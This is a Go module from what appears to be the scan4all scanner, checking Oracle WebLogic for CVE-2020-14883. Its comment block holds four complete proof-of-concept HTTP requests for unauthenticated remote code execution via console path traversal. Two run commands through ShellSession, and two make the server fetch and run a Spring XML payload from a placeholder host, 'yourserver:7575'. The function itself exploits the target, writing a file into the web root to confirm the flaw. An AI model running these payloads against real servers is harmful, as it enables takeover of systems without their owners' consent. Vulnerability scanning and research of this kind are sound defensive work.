package weblogic

import (
	"github.com/hktalent/scan4all/lib/util"
)

/*
Proof of Concept (PoC) 1: using tangosol.coherence.mvel2.sh.ShellSession() for Windows-based targets

POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('calc.exe');");
Proof of Concept (PoC) 2: using tangosol.coherence.mvel2.sh.ShellSession() for Linux-based targets

POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/CVE-2020-14883.txt');")
Proof of Concept (PoC) 3: using com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext for Windows-based targets

# Content of poc.xml file

<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">

	<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
	    <constructor-arg>
	        <list>
	            <value>cmd</value>
	            <value>/c</value>
	            <value>
	                <![CDATA[calc]]>
	            </value>
	        </list>
	    </constructor-arg>
	</bean>

</beans>

POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://yourserver:7575/poc.xml")
Proof of Concept (PoC) 4: using com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext for Windows-based targets

POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://yourserver:7575/poc.xml")
*/
func CVE_2020_14883(url string) bool {
	if _, err := util.HttpRequset(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/testnmanp.txt%27);%22)", "GET", "", false, nil); err == nil {
		if req2, err2 := util.HttpRequset(url+"/console/framework/skins/wlsconsole/css/testnmanp.txt", "GET", "", false, nil); err2 == nil {
			if req2.StatusCode == 200 {
				util.SendLog(req2.RequestUrl, "CVE-2020-14883", "Found vuln Weblogic", "")
				return true
			}
		}
	}
	return false
}
